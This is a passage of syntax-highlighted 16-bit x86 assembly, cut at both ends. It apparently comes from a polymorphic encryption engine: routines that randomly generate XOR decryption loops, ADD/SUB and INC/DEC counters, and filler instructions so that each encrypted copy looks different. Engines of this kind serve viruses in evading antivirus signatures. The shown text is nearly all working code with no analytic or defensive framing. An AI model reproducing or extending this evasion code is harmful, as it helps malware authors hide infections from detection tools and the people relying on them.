&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;use alternative for MOV?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Store_MOV<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Fh</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shl</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mul</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cl</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">30C0h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short no_sub<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">28h</span><br />
<br />
no_sub<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Mov_BorW<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Mov_BorW<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>add_mode<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xlat<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cl</span><br />
<br />
Store_MOV<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: black; font-style: italic;">;--- insert ADD AX,xxxx -----------------------------------</span><br />
<br />
ADD_AX<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>ADD_Val&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;save add-value here</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8110h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8010h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short Done_ADD&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;use ADD?</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ah</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">div</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cl</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ah</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short Done_ADD&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;use ADD?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short Make_ADD_DX &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;AX or DX?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short ADD_What<br />
<br />
Make_ADD_DX<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0C281h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
<br />
ADD_What<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
<br />
Done_ADD<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: black; font-style: italic;">;--- generate encryption command --------------------------</span><br />
<br />
Generate_Crypter<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;type of XOR command</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Val_Encrypt<br />
<br />
Reg_Encrypt<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Get_Crypter &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;encrypt with register</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; ADD_2_ADC<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Store_ADD<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short xxxx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10h</span><br />
<br />
xxxx<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; add_dir<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short yyyy<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
yyyy<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>XOR_Ofs<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
Val_Encrypt<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;encrypt with value</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Store_ADD<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Get_Crypter<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; ADD_2_ADC<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; xxxx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>XOR_Val<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; Is_B_or_W<br />
<br />
<span style="color: black; font-style: italic;">;--- Generate INC/DEC command------------------------------</span><br />
<br />
Gen_Counter<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;no CMPSW/SCASW if BX is used</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short AddSub_IncDec<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ADD/SUB/INC/DEC or CMPSW/SCASW</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short CMPSW_<br />
<br />
AddSub_IncDec<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ADD/SUB or INC/DEC?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short AddSub<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;INC/DEC</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;up or down?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Count_Size<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span><br />
<br />
Count_Size<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; add_ind<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;byte or word?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Done_CSize<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;same instruction again</span><br />
<br />
Done_CSize<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: black; font-style: italic;">;---</span><br />
<br />
AddSub<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ADD/SUB</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short No_CLC&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;carry?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0F8h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;insert CLC</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
<br />
No_CLC<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">83h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
